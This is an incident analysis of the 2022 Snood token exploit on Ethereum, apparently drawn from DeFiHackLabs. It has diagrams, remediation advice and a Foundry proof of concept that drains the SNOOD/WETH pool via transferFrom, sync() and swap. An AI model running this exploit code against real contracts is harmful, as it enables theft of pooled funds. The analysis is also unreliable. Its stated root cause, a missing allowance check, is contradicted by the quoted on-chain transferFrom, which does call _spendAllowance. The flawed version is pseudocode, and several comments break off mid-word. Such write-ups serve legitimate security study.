# Snood — transferFrom LP Drain + sync Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2022-06-08 |
| **Protocol** | Snood Token (SNOOD) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$28,000 (WETH) |
| **Attacker** | [0x180ea08644b123D8A3f0ECcf2a3b45A582075538](https://etherscan.io/address/0x180ea08644b123D8A3f0ECcf2a3b45A582075538) |
| **Attack Tx** | Block 14,983,660 |
| **Vulnerable Contract** | SNOOD Token [0xD45740aB9ec920bEdBD9BAb2E863519E59731941](https://etherscan.io/address/0xD45740aB9ec920bEdBD9BAb2E863519E59731941) |
| **Root Cause** | The SNOOD token's `transferFrom()` function does not validate the allowance of the `from` parameter, enabling direct token theft from the LP pool; subsequent `sync()` call manipulates the price to realize WETH profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Snood_exp.sol) |

---
## 1. Vulnerability Overview

The Snood (SNOOD) token's custom ERC20 implementation did not correctly implement allowance validation in the `transferFrom()` function. This allowed SNOOD tokens held by the LP pool to be transferred to an arbitrary address without authorization.

The attacker directly drained SNOOD tokens from the Uniswap V2-based SNOOD/WETH LP pool, then called `sync()` to update the LP pool's reserves. This caused the SNOOD price (SNOOD per WETH) to crash sharply, and the attacker executed a swap at the manipulated price to extract WETH.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable SNOOD transferFrom (pseudocode)
contract SnoodToken {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // ❌ Vulnerability: allowance validation is absent or bypassable
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        // ❌ No validation of _allowances[sender][msg.sender]
        // Allows draining tokens from an arbitrary sender (LP pool)
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}

// Uniswap V2 sync():
// function sync() external lock {
//     _update(
//         IERC20(token0).balanceOf(address(this)),
//         IERC20(token1).balanceOf(address(this)),
//         reserve0, reserve1
//     );
// }
// After draining SNOOD, sync() → reserve updated to actual balance (greatly reduced)
// → On the next swap, SNOOD is treated as extremely cheap → excess WETH paid out

// ✅ Correct ERC20 transferFrom
contract SnoodTokenFixed {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        // ✅ Allowance must be validated
        uint256 allowed = _allowances[sender][msg.sender];
        require(allowed >= amount, "ERC20: insufficient allowance");

        if (allowed != type(uint256).max) {
            _allowances[sender][msg.sender] = allowed - amount;
        }
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**IERC20Upgradeable.sol** — Entry point:
```solidity
// ❌ Root cause: SNOOD token's `transferFrom()` does not validate the allowance of the `from` parameter, enabling direct token theft from the LP pool; subsequent `sync()` manipulates the price to extract W
    function transferFrom(  // ❌ Unauthorized transferFrom
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

```

**ERC777Upgradeable.sol** — Related contract:
```solidity
// ❌ Root cause: SNOOD token's `transferFrom()` does not validate the allowance of the `from` parameter, enabling direct token theft from the LP pool; subsequent `sync()` manipulates the price to extract W
    function transferFrom(  // ❌ Unauthorized transferFrom
        address holder,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(holder, spender, amount);
        _send(holder, recipient, amount, "", "", false);
        return true;
    }
```

**SchnoodleV9.sol** — Related contract:
```solidity
// ❌ Root cause: SNOOD token's `transferFrom()` does not validate the allowance of the `from` parameter, enabling direct token theft from the LP pool; subsequent `sync()` manipulates the price to extract W
    function _beforeTokenTransfer(address operator, address from, address to, uint256 amount) internal override {  // ❌ Vulnerability
        // Ensure the sender has enough unlocked balance to perform the transfer
        if (from != address(0)) {
            uint256 standardAmount = _getStandardAmount(amount);
            uint256 balance = balanceOf(from);
            require(standardAmount > balance || standardAmount <= balance - lockedBalanceOf(from), "Schnoodle: transfer amount exceeds unlocked balance");
            require(!hasRole(LOCKED, from));
        }

        super._beforeTokenTransfer(operator, from, to, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Check SNOOD/WETH LP pool state
    │       SNOOD LP [0x0F6b0960d2569f505126341085ED7f0342b67DAe]
    │       getReserves() → (reserveSNOOD, reserveWETH)
    │
    ├─[2] ⚡ Call SNOOD.transferFrom(LP_pair, attacker, snoodBalance)
    │       No allowance validation → drain entire SNOOD balance from LP pool
    │       LP pool SNOOD balance: drastically reduced
    │
    ├─[3] Call SNOOD_LP.sync()
    │       reserve0(SNOOD) = updated to current balance (drastically reduced)
    │       reserve1(WETH) = unchanged
    │       → SNOOD/WETH price ratio distorted
    │           (SNOOD in LP plummets → WETH per SNOOD spikes)
    │
    ├─[4] Calculate optimal swap amount using AMM formula
    │       amountIn = (2 * reserveSNOOD - sqrt(4*r0*r1)) / 2
    │       (swap executable at terms far more favorable than real price)
    │
    ├─[5] SNOOD_LP.swap(0, wethOut, attacker, "")
    │       Swap held SNOOD → WETH
    │       Based on manipulated reserve → excess WETH received
    │
    └─[6] Profit: ~$28,000 WETH secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface ISNOOD {
    // ⚡ Vulnerable function: transferFrom with no allowance validation
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Pair {
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract ContractTest is Test {
    ISNOOD         snood   = ISNOOD(0xD45740aB9ec920bEdBD9BAb2E863519E59731941);
    IERC20         weth    = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair snoodLP = IUniswapV2Pair(0x0F6b0960d2569f505126341085ED7f0342b67DAe);

    address attacker = 0x180ea08644b123D8A3f0ECcf2a3b45A582075538;

    function setUp() public {
        vm.createSelectFork("mainnet", 14_983_660);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] WETH", weth.balanceOf(address(this)), 18);

        // [Step 1] Check LP pool state
        (uint112 r0, uint112 r1,) = snoodLP.getReserves();
        uint256 snoodInLP = snood.balanceOf(address(snoodLP));

        emit log_named_decimal_uint("SNOOD in LP", snoodInLP, 18);

        // [Step 2] ⚡ Drain SNOOD directly from LP pool without allowance
        snood.transferFrom(address(snoodLP), address(this), snoodInLP);

        // [Step 3] Update reserves via sync() (SNOOD reserve drastically reduced)
        snoodLP.sync();

        (uint112 r0New, uint112 r1New,) = snoodLP.getReserves();
        emit log_named_decimal_uint("SNOOD reserve after sync", r0New, 18);

        // [Step 4] Calculate optimal swap amount, then swap SNOOD → WETH
        uint256 snoodToSwap = snood.balanceOf(address(this));
        snood.approve(address(snoodLP), snoodToSwap);

        // AMM formula: amountOut = amountIn * 997 * reserveOut / (reserveIn * 1000 + amountIn * 997)
        uint256 wethOut = uint256(r1New) * snoodToSwap * 997 /
            (uint256(r0New) * 1000 + snoodToSwap * 997);

        // Transfer SNOOD first, then swap
        snood.transferFrom(address(this), address(snoodLP), snoodToSwap);
        snoodLP.swap(0, wethOut, address(this), "");

        emit log_named_decimal_uint("[After] WETH stolen", weth.balanceOf(address(this)), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC20 transferFrom allowance validation missing + sync price manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Custom ERC20 allowance bypass + AMM reserve manipulation |
| **Attack Vector** | `transferFrom(LP, attacker, balance)` → `sync()` → `swap()` |
| **Precondition** | No allowance validation in SNOOD transferFrom |
| **Impact** | Full SNOOD drain from LP pool followed by WETH extraction |

---
## 6. Remediation Recommendations

1. **Adopt OpenZeppelin ERC20**: Use OpenZeppelin's audited implementation instead of a custom ERC20 to guarantee allowance validation.
2. **Comply with transferFrom standard**: Always validate `_allowances[sender][msg.sender] >= amount` and deduct the allowance after use.
3. **ERC20 Conformance Testing**: Before deployment, verify standard compliance using OpenZeppelin's ERC20 test suite or a token conformance checking tool.
4. **Slither Static Analysis**: Use the `incorrect-erc20` detector to proactively identify non-standard ERC20 implementations.

---
## 7. Lessons Learned

- **Same pattern as Novo**: The exact same mechanism as the May 2022 Novo Token attack (transferFrom flaw + sync manipulation) occurred on Ethereum Mainnet as well.
- **$28,000 is small-scale but entirely preventable**: A single `require` statement would have prevented this vulnerability.
- **Dual role of sync()**: `sync()` is a reserve update utility, but when called immediately after an externally manipulated LP balance, it becomes a tool that legitimizes the manipulated state.
- **Recurring custom ERC20 mistake**: Missing allowance validation in custom ERC20 implementations has recurred on both Ethereum and BSC. This single mistake is enough to make the entire LP pool a target.